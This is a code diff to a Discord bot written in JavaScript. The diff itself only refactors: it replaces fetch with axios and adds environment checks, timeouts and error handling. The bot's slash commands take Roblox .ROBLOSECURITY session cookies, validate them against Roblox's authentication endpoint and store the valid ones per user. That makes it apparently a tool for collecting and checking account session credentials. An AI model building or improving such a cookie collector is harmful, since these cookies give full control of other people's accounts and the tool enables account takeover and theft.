@@ -1,10 +1,19 @@
 require('dotenv').config();
 const { Client, GatewayIntentBits, Partials, SlashCommandBuilder, REST, Routes } = require('discord.js');
-const fetch = require('node-fetch');
+const axios = require('axios');
 
 const TOKEN = process.env.DISCORD_BOT_TOKEN;
 const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
 const GUILD_ID = process.env.DISCORD_GUILD_ID;
+
+// Check for required environment variables
+if (!TOKEN || !CLIENT_ID || !GUILD_ID) {
+  console.error('❌ Missing required environment variables:');
+  if (!TOKEN) console.error('  - DISCORD_BOT_TOKEN is not set');
+  if (!CLIENT_ID) console.error('  - DISCORD_CLIENT_ID is not set');
+  if (!GUILD_ID) console.error('  - DISCORD_GUILD_ID is not set');
+  process.exit(1);
+}
 
 const client = new Client({
   intents: [
@@ -30,18 +39,15 @@ async function validateRobloxCookie(cookie) {
     // Clean the cookie input - remove .ROBLOSECURITY= prefix if present
     const cleanCookie = cookie.replace(/^\.ROBLOSECURITY=/, '');
     
-    const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
+    const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         Cookie: `.ROBLOSECURITY=${cleanCookie}`,
         'User-Agent': 'Roblox/WinInet',
       },
+      timeout: 2500 // 2.5 second timeout to stay under Discord's 3 second limit
     });
 
-    if (!res.ok) {
-      return { valid: false, error: `HTTP ${res.status}` };
-    }
-
-    const data = await res.json();
+    const data = response.data;
     
     // Check if the response contains valid user data
     if (!data.id || !data.name) {
@@ -50,7 +56,13 @@ async function validateRobloxCookie(cookie) {
 
     return { valid: true, data, cleanCookie };
   } catch (error) {
-    return { valid: false, error: error.message };
+    if (error.response) {
+      return { valid: false, error: `HTTP ${error.response.status} - ${error.response.statusText}` };
+    } else if (error.code === 'ECONNABORTED') {
+      return { valid: false, error: 'Request timeout - Roblox API is slow, try again' };
+    } else {
+      return { valid: false, error: error.message };
+    }
   }
 }
 
@@ -114,40 +126,52 @@ client.on('interactionCreate', async interaction => {
   if (interaction.commandName === 'testcookie') {
     const cookie = interaction.options.getString('cookie');
 
+    // Immediately acknowledge the interaction
     await interaction.deferReply({ ephemeral: true });
 
-    const validation = await validateRobloxCookie(cookie);
-    
-    if (!validation.valid) {
-      await interaction.editReply(`❌ Invalid cookie: ${validation.error}`);
-      return;
-    }
+    try {
+      const validation = await validateRobloxCookie(cookie);
+      
+      if (!validation.valid) {
+        await interaction.editReply(`❌ Invalid cookie: ${validation.error}`);
+        return;
+      }
 
-    await interaction.editReply(`✅ Valid cookie! User authenticated as: **${validation.data.name}** (ID: ${validation.data.id})\n\`\`\`json\n${JSON.stringify(validation.data, null, 2)}\n\`\`\``);
+      await interaction.editReply(`✅ Valid cookie! User authenticated as: **${validation.data.name}** (ID: ${validation.data.id})\n\`\`\`json\n${JSON.stringify(validation.data, null, 2)}\n\`\`\``);
+    } catch (error) {
+      console.error('Error in testcookie command:', error);
+      await interaction.editReply(`❌ Unexpected error occurred. Please try again.`);
+    }
   }
 
   if (interaction.commandName === 'submitcookie') {
     const cookie = interaction.options.getString('cookie');
     const userId = interaction.user.id;
 
+    // Immediately acknowledge the interaction
     await interaction.deferReply({ ephemeral: true });
 
-    // Validate cookie before storing
-    const validation = await validateRobloxCookie(cookie);
-    
-    if (!validation.valid) {
-      await interaction.editReply(`❌ Invalid cookie: ${validation.error}\nPlease provide a valid .ROBLOSECURITY cookie from Roblox.`);
-      return;
+    try {
+      // Validate cookie before storing
+      const validation = await validateRobloxCookie(cookie);
+      
+      if (!validation.valid) {
+        await interaction.editReply(`❌ Invalid cookie: ${validation.error}\nPlease provide a valid .ROBLOSECURITY cookie from Roblox.`);
+        return;
+      }
+
+      // Store cookie and user data securely
+      userCookies.set(userId, {
+        cookie: validation.cleanCookie,
+        robloxData: validation.data,
+        submittedAt: new Date()
+      });
+
+      await interaction.editReply(`✅ Valid cookie received and stored securely!\nAuthenticated as: **${validation.data.name}** (ID: ${validation.data.id})`);
+    } catch (error) {
+      console.error('Error in submitcookie command:', error);
+      await interaction.editReply(`❌ Unexpected error occurred. Please try again.`);
     }
-
-    // Store cookie and user data securely
-    userCookies.set(userId, {
-      cookie: validation.cleanCookie,
-      robloxData: validation.data,
-      submittedAt: new Date()
-    });
-
-    await interaction.editReply(`✅ Valid cookie received and stored securely!\nAuthenticated as: **${validation.data.name}** (ID: ${validation.data.id})`);
   }
 });
 
